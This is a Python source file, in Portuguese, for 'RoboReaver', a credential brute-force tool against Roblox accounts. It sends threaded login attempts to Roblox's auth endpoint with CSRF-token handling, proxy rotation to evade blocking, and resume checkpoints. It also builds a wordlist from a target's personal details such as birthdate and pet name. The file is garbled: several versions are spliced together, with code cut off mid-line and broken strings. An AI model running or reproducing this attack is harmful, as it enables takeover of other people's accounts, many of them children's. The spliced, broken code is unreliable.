# ======================================================================= #
#  RoboReaver v3.0 - The Annihilator Edition                              #
#  Features: Wordlist Generator, Checkpoints, Advanced Logging & Proxies  #
#  Autor: [Seu Nickname]                                                  #
#  GitHub: [Seu Link do GitHub]                                           #
# ======================================================================= #

# --- Bloco de Auto-Instalação de Dependências (Mais Robusto) ---
import os
import sys
import subprocess
import time

def check_and_install_dependencies():
    dependencies = ['requests', 'colorama', 'beautifulsoup4']
    print("[*] Verificando dependências do sistema...")
    all_ok = True
    for dep in dependencies:
        try:
            __import__(dep)
            print(f"  - {dep}: [OK]")
        except ImportError:
            all_ok = False
            print(f"  - {dep}: [NÃO ENCONTRADO]")
            print(f"[*] Instalando '{dep}' via pip...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
                print(f"[+] '{dep}' instalado com sucesso.")
            except subprocess.CalledProcessError:
                print(f"[!!!] FALHA CRÍTICA ao instalar '{dep}'. Saia e tente 'pip install {dep}' manualmente.")
                sys.exit(1)
    if all_ok: print("[+] Todas as dependências estão satisfeitas.")
    else: print("[+] Novas dependências foram instaladas.")
    time.sleep(2)

# --- Fim do Bloco de Auto-Instalação ---

check_and_install_dependencies()

import requests
import threading
from colorama import Fore, Style, init
from itertools import cycle
from datetime import datetime
import json

init(autoreset=True)

class Estilo:
    BRIGHT, RESET = Style.BRIGHT, Style.RESET_ALL
    RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN

class RoboReaver:
    # BANNERS SÃO FEITOS COM RAW, TRIPLE-QUOTED STRINGS PARA EVITAR QUALQUER ERRO DE SINTAXE
    BANNER_PRINCIPAL = r"""
    ____       _           ____                     __   __
   |  _ \ ___ | |__   ___ |  _ \ ___  __ _ _ __    |  \ /  |
   | |_) / _ \| '_ \ / _ \| |_) / _ \/ _` | '_ \   |       |
   |  _ < (_) | |_) | (_) |  _ <  __/ (_| | | | |  | |\ /| |
   |_| \_\___/|_.__/ \___/|_| \_\___|\__,_|_| |_|  |_|` '|_|  v3.0

               >> Annihilator Edition <<
    """
    BANNER_SUCESSO = r"""
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       db                   db       .         dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXb.                 .dXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXX'
    `9XXXXXXXXXXXP' `9XX'   DIE   `98v8P'  DIE    `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .`GI'.         .X9       ~~~~~~~
                      `98.   .--.   `  '   .--.   .8P'
                        `98o--:' `-.     `o--'
                           `--'       `--'
                           SENHA ENCONTRADA!
    """

    def __init__(self):
        self.username = ""
        self.passwords = []
        self.proxies = []
        self.proxy_cycle = None
        self.senha_encontrada = None
        self.senhas_testadas = 0
        self.stop_threads = False
        self.log_file = None
        self.lock = threading.Lock()
        self.start_index = 0
        self.checkpoint_file = ""

    def _setup_logger(self):
        if not os.path.exists('logs'): os.makedirs('logs')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_filename = f"logs/attack_{self.username}_{timestamp}.log"
        self.log_file = open(log_filename, 'w')
        self._log(f"Sessão de ataque iniciada para o alvo: {self.username}")
        self._log(f"Wordlist: {len(self.passwords)} senhas | Proxies: {len(self.proxies)}")

    def _log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_file.write(f"[{timestamp}] {message}\n")
        self.log_file.flush()

    def _carregar_recursos(self, wordlist_path, proxy_path):
        try:
            with open(wordlist_path, 'r', errors='ignore') as f:
                self.passwords = [line.strip() for line in f if line.strip()]
            if not self.passwords: return False, "Wordlist vazia."
        except FileNotFoundError: return False, "Arquivo da wordlist não encontrado."
        
        self.checkpoint_file = f"checkpoints/{self.username}.chk"
        if os.path.exists(self.checkpoint_file):
            resp = input(f"{Estilo.YELLOW}[?] Encontramos um ataque anterior para '{self.username}'. Deseja continuar de onde parou? (s/n):{Estilo.CYAN} ").lower()
            if resp == 's':
                with open(self.checkpoint_file, 'r') as f: last_pass = f.read().strip()
                try:
                    self.start_index = self.passwords.index(last_pass) + 1
                    print(f"{Estilo.GREEN}[+] Retomando ataque após a senha: '{last_pass}'{Estilo.RESET}")
                except ValueError:
                    print(f"{Estilo.RED}[!] Senha do checkpoint não encontrada na wordlist atual. Começando do início.{Estilo.RESET}")
        
        if proxy_path:
            try:
                with open(proxy_path, 'r', errors='ignore') as f: self.proxies = [line.strip() for line in f if line.strip()]
                if self.proxies: self.proxy_cycle = cycle(self.proxies)
            except FileNotFoundError: return False, "Arquivo de proxy não encontrado."
        return True, "Sucesso"

    def _worker(self, password_queue, thread_id):
        with requests.Session() as s:
            s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            while not self.stop_threads:
                try: password, index = password_queue.get(timeout=1)
                except: break
                
                proxy = next(self.proxy_cycle) if self.proxy_cycle else None
                proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
                
                try:
                    csrf_resp = s.post("https://auth.roblox.com/v2/login", proxies=proxies, timeout=10)
                    s.headers['X-CSRF-TOKEN'] = csrf_resp.headers["x-csrf-token"]
                    login_resp = s.post("https://auth.roblox.com/v2/login", json={"ctype": "Username", "cvalue": self.username, "password": password}, proxies=proxies, timeout=10)
                    
                    with self.lock: self.senhas_testadas += 1
                    
                    if "user" in login_resp.json():
                        self._log(f"SUCESSO! Senha encontrada: {password}")
                        with self.lock: self.senha_encontrada, self.stop_threads = password, True
                    else:
                        self._log(f"FALHA: {password} (Proxy: {proxy or 'Nenhum'})")
                    
                    if self.senhas_testadas % 20 == 0: # Salva checkpoint a cada 20 tentativas
                        with self.lock, open(self.checkpoint_file, 'w') as f: f.write(password)
                        
                except Exception as e:
                    self._log(f"ERRO DE CONEXÃO: {password} (Proxy: {proxy or 'Nenhum'}) - {e}")
                
                password_queue.task_done()
    
    def _display_status(self):
        anim = cycle([' घूम ', ' रहा ', ' है  ', ' ?? '])
        start_time = time.time()
        while not self.stop_threads:
            with self.lock:
                total, tested = len(self.passwords), self.senhas_testadas + self.start_index
                progress, percent = int(50*tested/total) if total>0 else 0, (tested/total)*100 if total>0 else 0
                pps = tested / (time.time() - start_time) if time.time() - start_time > 0 else 0
                bar = f"{Estilo.GREEN}{'█'*progress}{Estilo.RED}{'-'*(50-progress)}{Estilo.RESET}"
                status = f"{Estilo.CYAN}{next(anim)} {Estilo.YELLOW}Alvo:{self.username} | Testando: {tested}/{total} [{bar}] {percent:.2f}% | {pps:.2f} p/s"
                sys.stdout.write(f"\r{status.ljust(100)}"); sys.stdout.flush()
            time.sleep(0.15)
        sys.stdout.write(f"\r{' ' * 100}\r")

    def _generate_wordlist(self):
        os.system('clear'); print(f"{Estilo.CYAN}--- Gerador de Wordlist Inteligente ---{Estilo.RESET}")
        print("Forneça o máximo de informações que souber sobre o alvo. Pressione Enter para pular.")
        info = {
            'nome': input("Primeiro nome: "), 'sobrenome': input("Sobrenome: "), 'apelido': input("Apelido: "),
            'dia': input("Dia de nascimento (DD): "), 'mes': input("Mês (MM): "), 'ano': input("Ano (YYYY): "),
            'pet': input("Nome do animal de estimação: "), 'time': input("Time do coração: "),
            'cidade': input("Cidade: "), 'idolo': input("Ídolo: ")
        }
        base_words = {val for val in info.values() if val}
        with_numbers = set()
        for word in base_words:
            with_numbers.add(word + "123"); with_numbers.add(word + info.get('ano', '')); with_numbers.add(word + info.get('dia', ''))
        mutations = {word.capitalize() for word in base_words} | {word.lower() for word in base_words}
        final_list = sorted(list(base_words | with_numbers | mutations))
        
        filename = input(f"\n{len(final_list)} senhas geradas. Nome do arquivo para salvar (ex: wordlist_alvo.txt): ")
        if not filename: print("Operação cancelada."); return
        with open(filename, 'w') as f: f.write('\n'.join(final_list))
        print(f"{Estilo.GREEN}Wordlist salva em '{filename}'. Use-a no ataque!{Estilo.RESET}"); time.sleep(3)

    def run(self):
        os.system('clear'); print(Estilo.CYAN + self.BANNER_PRINCIPAL + Estilo.RESET)
        choice = input(f"{Estilo.YELLOW}[1] Iniciar Ataque\n[2] Gerador de Wordlist\n[3] Sair\n> {Estilo.CYAN}")
        
        if choice == '1': self.iniciar_ataque()
        elif choice == '2': self._generate_wordlist()
        elif choice == '3': sys.exit(0)
        else: print(f"{Estilo.RED}Opção inválida.{Estilo.RESET}"); time.sleep(1)

    def iniciar_ataque(self):
        os.system('clear'); print(Estilo.CYAN + self.BANNER_PRINCIPAL + Estilo.RESET)
        self.username = input(f"{Estilo.YELLOW}[?] Username do Alvo: {Estilo.CYAN}")
        if not self.username: print("Username inválido."); return
        wordlist_p = input(f"{Estilo.YELLOW}[?] Caminho da Wordlist: {Estilo.CYAN}")
        proxy_p = input(f"{Estilo.YELLOW}[?] Caminho dos Proxies (Opcional): {Estilo.CYAN}")
        try: thread_c = int(input(f"{Estilo.YELLOW}[?] Threads (recom. 10-50): {Estilo.CYAN}"))
        except: print("Threads inválidas."); return

        ok, reason = self._carregar_recursos(wordlist_p, proxy_p); 
        if not ok: print(f"{Estilo.RED}[!] Erro: {reason}{Estilo.RESET}"); time.sleep(3); return
        self._setup_logger()
        
        from queue import Queue
        password_queue = Queue()
        for i, p in enumerate(self.passwords[self.start_index:]): password_queue.put((p, self.start_index + i))

        print(f"\n{Estilo.BRIGHT}Aniquilador preparado. Iniciando ataque em 3 segundos...{Estilo.RESET}"); time.sleep(3)
        
        threads = [threading.Thread(target=self._worker, args=(password_queue, i), daemon=True) for i in range(thread_c)]
        status_thread = threading.Thread(target=self._display_status, daemon=True)
        status_thread.start(); [t.start() for t in threads]
        
        try: [t.join() for t in threads]
        except KeyboardInterrupt: print(f"\n\n{Estilo.RED}Ataque interrompido.{Estilo.RESET}"); self.stop_threads = True
        
        self.stop_threads = True; status_thread.join()
        
        if self.senha_encontrada:
            os.system('clear'); print(Estilo.YELLOW + self.BANNER_SUCESSO + Estilo.RESET)
            print(f"\n{Estilo.GREEN}A senha para '{self.username}' é: {Estilo.BRIGHT}{self.senha_encontrada}{Estilo.RESET}")
            if os.path.exists(self.checkpoint_file): os.remove(self.checkpoint_file) # Limpa checkpoint
        else:
            print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] FIM DA LINHA. Senha não encontrada.{Estilo.RESET}")
        
        self.log_file.close()
        input("\nPressione Enter para voltar ao menu...")

if __name__ == "__main__":
    while True:
        try:
            RoboReaver().run()
        except Exception as e:
            print(f"\n{Estilo.RED}Erro fatal no programa: {e}. Reiniciando menu...")
            time.sleep(4)ut(p)
        
        print(f"\n{Estilo.BRIGHT}Iniciando ataque em 3 segundos... Pressione CTRL+C para parar.{Estilo.RESET}"); time.sleep(3)

        threads = [threading.Thread(target=self._worker, args=(password_queue,), daemon=True) for _ in range(self.thread_count)]
        status_thread = threading.Thread(target=self._display_status, daemon=True)
        
        status_thread.start()
        for t in threads: t.start()
        
        try:
            for t in threads: t.join()
        except KeyboardInterrupt:
            print(f"\n\n{Estilo.RED}[!] Ataque interrompido pelo usuário!{Estilo.RESET}")
            self.stop_threads = True
        
        self.stop_threads = True
        status_thread.join()
        
        if self.senha_encontrada:
            self._banner_sucesso()
        else:
            print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FINALIZADO. A senha não foi encontrada na sua wordlist.{Estilo.RESET}")
        
        input("\nPressione Enter para voltar ao menu...")

def main_menu():
    while True:
        try:
            reaver = RoboReaver()
            reaver._banner_principal()
            print(f"{Estilo.CYAN}   [1] Iniciar Ataque Brute-Force{Estilo.RESET}")
            print(f"{Estilo.CYAN}   [2] Sobre{Estilo.RESET}")
            print(f"{Estilo.CYAN}   [3] Sair{Estilo.RESET}\n")
            
            choice = input(f"{Estilo.YELLOW}   Escolha uma opção > {Estilo.RESET}")
            
            if choice == '1':
                reaver.run()
            elif choice == '2':
                reaver._banner_principal()
                print(f"""
        {Estilo.BRIGHT}{Estilo.MAGENTA}RoboReaver v2.0{Estilo.RESET}
        Uma ferramenta de pesquisa de segurança multi-thread.
        {Estilo.BLUE}Novidades da v2.0:{Estilo.RESET}
          - Auto-instalação de dependências.
          - Suporte a proxies para evasão de bloqueio.
          - Verificação de existência do nome de usuário.
          - Manipulação inteligente de erros de rede/proxy.
          - Interface e organização de código aprimoradas.
        
        {Estilo.CYAN}Autor: [Seu Nickname]{Estilo.RESET}
        {Estilo.CYAN}GitHub: [Link do seu GitHub]{Estilo.RESET}
                """)
                input("\nPressione Enter para voltar ao menu...")
            elif choice == '3':
                print(f"\n{Estilo.YELLOW}Encerrando...{Estilo.RESET}"); sys.exit(0)
            else:
                print(f"\n{Estilo.RED}[!] Opção inválida.{Estilo.RESET}"); time.sleep(1)
        except Exception as e:
            print(f"\n{Estilo.RED}Um erro inesperado ocorreu: {e}")
            input("Pressione Enter para reiniciar o menu...")

if __name__ == "__main__":
    main_menu()| |_) / _ \| '_ \ / _ \| |_) / _ \/ _` | '_ \\
|  _ < (_) | |_) | (_) |  _ <  __/ (_| | | | |
|_| \_\___/|_.__/ \___/|_| \_\___|\__,_|_| |_|
        {Estilo.YELLOW}Brute-Force Avançado para Roblox{Estilo.RESET}
    """)

def banner_sucesso(senha):
    os.system('clear')
    print(Estilo.GREEN + Estilo.BRIGHT)
    print("*" * 60)
    print("*" + " " * 58 + "*")
    print(f"*   {'SENHA ENCONTRADA COM SUCESSO!':^56}   *")
    print("*" + " " * 58 + "*")
    print("*" * 60)
    print(f"\n\n{Estilo.CYAN}A senha para a conta foi localizada:\n")
    print(f"{' ' * 20}{Estilo.YELLOW}>> {senha} <<\n\n")
    print(Estilo.GREEN + "*" * 60)
    print(Style.RESET_ALL)

# --- Lógica de Brute-Force ---

def attempt_login(session, username, password):
    """
    Tenta fazer login com um único par de username/senha.
    Retorna True em caso de sucesso, False em caso de falha.
    """
    login_url = "https://auth.roblox.com/v2/login"
    
    # 1. Obter o token X-CSRF, essencial para a requisição de login
    try:
        response = session.post(login_url, timeout=10)
        csrf_token = response.headers.get("x-csrf-token")
        if not csrf_token:
            return False, "csrf_error"
        session.headers['X-CSRF-TOKEN'] = csrf_token
    except requests.RequestException:
        return False, "network_error"

    # 2. Montar e enviar a requisição de login
    payload = {
        "ctype": "Username",
        "cvalue": username,
        "password": password
    }
    try:
        response = session.post(login_url, json=payload, timeout=10)
        data = response.json()
        
        # O roblox retorna um 'user' object em caso de sucesso
        if "user" in data:
            return True, "success"
        # Verifica erros conhecidos
        elif "errors" in data and any(e.get("code") == 1 for e in data["errors"]):
            return False, "invalid_credentials"
        elif response.status_code == 429: # Too Many Requests
            return False, "rate_limit"
        else:
            return False, "unknown_error"
            
    except (requests.RequestException, ValueError):
        return False, "network_error"


def worker(username, wordlist_queue):
    """
    Função que cada thread executará para testar as senhas.
    """
    global senha_encontrada, senhas_testadas, stop_threads
    
    # Cada thread tem sua própria sessão para simular um navegador independente
    with requests.Session() as session:
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Accept': 'application/json, text/plain, */*'
        })

        while not stop_threads:
            try:
                # Pega uma senha da fila
                password = wordlist_queue.get(timeout=1)
            except:
                # Fila vazia, a thread pode parar
                break
                
            if stop_threads: break
            
            success, reason = attempt_login(session, username, password)

            with lock:
                senhas_testadas += 1
            
            if success:
                with lock:
                    senha_encontrada = password
                    stop_threads = True # Sinaliza para todas as outras threads pararem
                wordlist_queue.task_done()
                break # Sai do loop da thread
            
            elif reason == "rate_limit":
                 # Se o Roblox nos bloquear, é melhor parar por um tempo
                 with lock:
                    if not stop_threads: # Evita múltiplas mensagens de erro
                        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[!] Fomos temporariamente bloqueados (Rate Limit). Pausando...{Estilo.RESET}")
                        stop_threads = True # Para o ataque atual
                        senha_encontrada = "RATE_LIMITED"
            
            wordlist_queue.task_done()

def display_status():
    """
    Thread dedicada a mostrar o status do ataque em tempo real.
    """
    animation = cycle(['|', '/', '-', '\\'])
    start_time = time.time()
    
    while not stop_threads:
        with lock:
            if total_senhas == 0:
                progress = 0
                percent = 0
            else:
                progress = int(50 * senhas_testadas / total_senhas)
                percent = (senhas_testadas / total_senhas) * 100
            
            elapsed_time = time.time() - start_time
            pass_per_second = senhas_testadas / elapsed_time if elapsed_time > 0 else 0
            
            status_bar = f"{Estilo.GREEN}{'█' * progress}{Estilo.RED}{'-' * (50 - progress)}{Estilo.RESET}"
            
            status_text = (
                f"{Estilo.CYAN}{next(animation)} {Estilo.YELLOW}Progresso: {senhas_testadas}/{total_senhas} "
                f"[{status_bar}] {percent:.2f}% | "
                f"{Estilo.MAGENTA}{pass_per_second:.2f} senhas/s"
            )
            
            sys.stdout.write(f"\r{status_text.ljust(80)}")
            sys.stdout.flush()
        
        time.sleep(0.1)
    
    # Limpa a linha de status no final
    sys.stdout.write(f"\r{' ' * 100}\r")
    sys.stdout.flush()

# --- Função Principal do Ataque ---
def start_bruteforce():
    global senha_encontrada, senhas_testadas, stop_threads, total_senhas
    
    banner_principal()
    
    # 1. Obter informações do usuário
    username = input(f"{Estilo.YELLOW}[?] Digite o username da conta Roblox: {Estilo.CYAN}")
    if not username:
        print(f"\n{Estilo.RED}[!] Username não pode ser vazio.{Estilo.RESET}"); time.sleep(2); return

    wordlist_path = input(f"{Estilo.YELLOW}[?] Digite o caminho para sua wordlist (ex: wordlist.txt): {Estilo.CYAN}")
    if not os.path.exists(wordlist_path):
        print(f"\n{Estilo.RED}[!] Arquivo da wordlist não encontrado em '{wordlist_path}'.{Estilo.RESET}"); time.sleep(2); return
        
    try:
        thread_count = int(input(f"{Estilo.YELLOW}[?] Quantas threads usar (recom. 10-50): {Estilo.CYAN}"))
    except ValueError:
        print(f"\n{Estilo.RED}[!] Número de threads inválido.{Estilo.RESET}"); time.sleep(2); return

    # 2. Carregar a wordlist e preparar a fila
    print(f"\n{Estilo.BLUE}[*] Carregando a wordlist, por favor aguarde...{Estilo.RESET}")
    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f.readlines() if line.strip()]
        total_senhas = len(passwords)
        if total_senhas == 0:
            print(f"\n{Estilo.RED}[!] Sua wordlist está vazia!{Estilo.RESET}"); time.sleep(2); return
    except Exception as e:
        print(f"\n{Estilo.RED}[!] Erro ao ler a wordlist: {e}{Estilo.RESET}"); time.sleep(2); return

    # Reinicia as variáveis de controle para um novo ataque
    senha_encontrada = None
    senhas_testadas = 0
    stop_threads = False

    # Coloca as senhas na fila para as threads consumirem
    from queue import Queue
    wordlist_queue = Queue()
    for p in passwords:
        wordlist_queue.put(p)

    print(f"{Estilo.GREEN}[+] Wordlist carregada com {total_senhas} senhas.{Estilo.RESET}")
    print(f"{Estilo.BRIGHT}Iniciando ataque em 3 segundos...{Estilo.RESET}")
    time.sleep(3)

    # 3. Iniciar as threads
    threads = []
    
    # Thread de status
    status_thread = threading.Thread(target=display_status)
    status_thread.daemon = True
    status_thread.start()

    # Threads de trabalho (workers)
    for _ in range(thread_count):
        thread = threading.Thread(target=worker, args=(username, wordlist_queue))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # 4. Aguardar a conclusão
    try:
        # Aguarda as threads finalizarem, ou o status ser interrompido
        wordlist_queue.join() # Bloqueia até que a fila esteja vazia
        stop_threads = True # Garante que a thread de status pare
        
    except KeyboardInterrupt:
        print(f"\n\n{Estilo.RED}[!] Ataque interrompido pelo usuário!{Estilo.RESET}")
        stop_threads = True

    status_thread.join() # Espera a thread de status terminar
    for thread in threads:
        thread.join(timeout=1.0) # Dá um tempinho para as threads de trabalho encerrarem

    # 5. Exibir o resultado
    if senha_encontrada and senha_encontrada != "RATE_LIMITED":
        banner_sucesso(senha_encontrada)
    elif senha_encontrada == "RATE_LIMITED":
        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FALHOU! O Roblox bloqueou nossas tentativas.{Estilo.RESET}")
        print(f"{Estilo.YELLOW}    Tente novamente mais tarde ou use menos threads.{Estilo.RESET}")
    else:
        print(f"\n{Estilo.RED}{Estilo.BRIGHT}[X] ATAQUE FINALIZADO! A senha não foi encontrada na sua wordlist.{Estilo.RESET}")
        print(f"{Estilo.YELLOW}    Tente uma wordlist diferente ou maior.{Estilo.RESET}")
        
    input("\nPressione Enter para voltar ao menu...")


# --- Menu Principal ---
def main_menu():
    while True:
        banner_principal()
        print(f"{Estilo.CYAN}   [1] Iniciar Ataque Brute-Force{Estilo.RESET}")
        print(f"{Estilo.CYAN}   [2] Sobre{Estilo.RESET}")
        print(f"{Estilo.CYAN}   [3] Sair{Estilo.RESET}\n")
        
        choice = input(f"{Estilo.YELLOW}   Escolha uma opção > {Estilo.RESET}")
        
        if choice == '1':
            start_bruteforce()
        elif choice == '2':
            banner_principal()
            print(f"""
    {Estilo.BRIGHT}{Estilo.MAGENTA}RoboReaver v1.0{Estilo.RESET}
    
    Uma ferramenta de brute-force multi-thread avançada,
    construída para fins de pesquisa e testes de segurança
    em contas Roblox em um ambiente controlado.
    
    {Estilo.BLUE}Funcionalidades:{Estilo.RESET}
      - Ataque Multi-Thread para máxima velocidade.
      - Simulação de Navegador com tokens CSRF.
      - Detecção de Rate Limit.
      - Interface de status em tempo real.
    
    {Estilo.CYAN}Autor: [Seu Nickname]{Estilo.RESET}
    {Estilo.CYAN}GitHub: [Link do seu GitHub]{Estilo.RESET}
            """)
            input("\nPressione Enter para voltar ao menu...")
        elif choice == '3':
            print(f"\n{Estilo.YELLOW}Encerrando...{Estilo.RESET}")
            sys.exit(0)
        else:
            print(f"\n{Estilo.RED}[!] Opção inválida, tente novamente.{Estilo.RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
